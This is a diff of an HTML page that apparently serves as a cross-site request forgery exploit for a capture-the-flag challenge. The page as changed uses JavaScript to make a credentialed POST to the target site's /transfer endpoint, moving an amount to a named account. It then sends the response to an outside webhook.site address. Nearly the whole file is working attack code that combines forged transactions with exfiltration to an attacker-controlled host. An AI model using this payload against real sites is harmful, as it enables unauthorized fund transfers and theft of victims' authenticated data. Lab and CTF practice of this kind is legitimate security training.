@@ -1,20 +1,13 @@
 <html>
- <form action="https://upcredit4.chall.malicecyber.com/transfer" method="POST">
-<input type="hidden" name="account" value="ld7RnN2yU" />
-<input type="hidden" name="amount" value="200" />
-</form>
- <script>Object.defineProperty(document, 'domain', {value: "upcredit4.chall.malicecyber.com"});</script>
 <script>
-/*
+
 var xhr2 = new XMLHttpRequest();
-xhr2.open("GET", "https://upcredit4.chall.malicecyber.com/flag/", false);
+xhr2.open("POST", "https://upcredit4.chall.malicecyber.com/transfer/", false);
 xhr2.withCredentials = true;
-xhr2.send();
+xhr2.send("account=ld7RnN2yU&amount=200");
 var xhr = new XMLHttpRequest();
 xhr.open("POST", "https://webhook.site/b0062056-f338-4b5a-a2fb-044aa09f1644", false);
 xhr.withCredentials = true;
 xhr.send(xhr2.response);
-*/
-document.forms[0].submit();  
 </script>
 </html>
